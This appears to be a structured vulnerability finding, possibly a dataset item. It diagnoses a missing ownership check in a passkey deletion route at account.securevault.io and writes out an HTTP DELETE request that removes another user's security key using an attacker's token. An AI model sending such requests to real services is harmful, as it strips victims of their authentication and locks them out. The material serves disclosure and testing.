diagnosis: The passkey deletion route removes security keys by credential_id without checking whether the record belongs to req.user.id. Any authenticated user who identifies or enumerates a target user's passkey credential ID can delete their hardware security key, revoking their primary or multi-factor authentication mechanism and causing a denial of service.
exploit_request:
DELETE /auth/passkeys/devices/cred_sec_99381024 HTTP/1.1
Host: account.securevault.io
Authorization: Bearer <attacker_jwt>
Content-Length: 0
